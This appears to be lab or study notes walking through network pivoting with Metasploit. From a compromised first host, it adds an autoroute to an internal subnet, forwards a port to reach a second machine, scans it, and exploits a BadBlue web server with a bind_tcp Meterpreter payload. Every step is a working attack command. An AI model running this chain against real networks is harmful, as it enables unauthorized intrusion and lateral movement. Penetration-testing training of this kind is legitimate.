## ðŸ—ï¸ Phase 1: Internal Network Discovery

You have compromised **Victim 1** and want to see if it can "talk" to other machines that you cannot see from the outside.

1. **Check for private interfaces:** Inside your first Meterpreter session:
    
    Bash
    
    ```
    meterpreter > ipconfig
    ```
    
    - **Goal:** Look for an IP that isn't your own or a public one (e.g., `10.2.27.1`).

---
## ðŸ—ºï¸ Phase 2: Building the Bridge (The Route)

By default, Metasploit only knows how to talk to the first victim. You must tell it to use **Victim 1** as a gateway to the internal subnet.

1. **Add the internal route:**
    
    Bash
    
    ```
    meterpreter > run autoroute -s 10.2.27.0/20
    ```
    
    - **What this does:** It tells Metasploit to route any traffic destined for the `10.2.27.x` range through the current Meterpreter session.
        
2. **Move to background:**
    
    Bash
    
    ```
    meterpreter > background
    ```

---
## ðŸ”¦ Phase 3: Service Discovery (The Tunnel)

Even with a route, external tools (like `nmap`) cannot "see" through the Meterpreter tunnel. You must create a **Port Forward** to bring a specific service from the hidden victim to your own machine.

1. **Create a local relay:** Re-enter your session and run:
    
    Bash
    
    ```
    meterpreter > portfwd add -l 1234 -p 80 -r 10.2.27.187
    ```
    
    - **Logic:** Any traffic you send to **your** machine on port `1234` is now tunneled to **Victim 2** on port `80`.
        
2. **Scan for versions:** Back in the MSF console (outside Meterpreter):
    
    Bash
    
    ```
    msf6 > db_nmap -sV -p 1234 localhost
    ```
    
    - **Why `localhost`?** Because you are scanning the "entrance" of the tunnel you built on your own machine.

---
## ðŸš€ Phase 4: Exploitation (Victim 2)

Now that you know Victim 2 is running **BadBlue** on port 80, you can attack it.

1. **Select the exploit:**
    
    Bash
    
    ```
    msf6 > search badblue
    msf6 > use exploit/windows/http/badblue_passthru
    ```
    
2. **Configure the target:**
    
    Bash
    
    ```
    msf6 exploit(...) > set RHOSTS 10.2.27.187
    msf6 exploit(...) > set RPORT 80
    ```
    
    - **Note:** We use the **real** port 80 here because the exploit uses the internal `autoroute` you set in Phase 2, not the `portfwd` relay.
        
3. **Set the correct payload (BIND):**
    
    Bash
    
    ```
    msf6 exploit(...) > set payload windows/meterpreter/bind_tcp
    ```
    
    - **Why `bind_tcp`?** Victim 2 is on a private network and cannot "call home" to your IP. A `bind_tcp` payload tells Victim 2 to open a port and wait for you to connect to it.
        
4. **Execute:**
    
    Bash
    
    ```
    msf6 exploit(...) > exploit
    ```

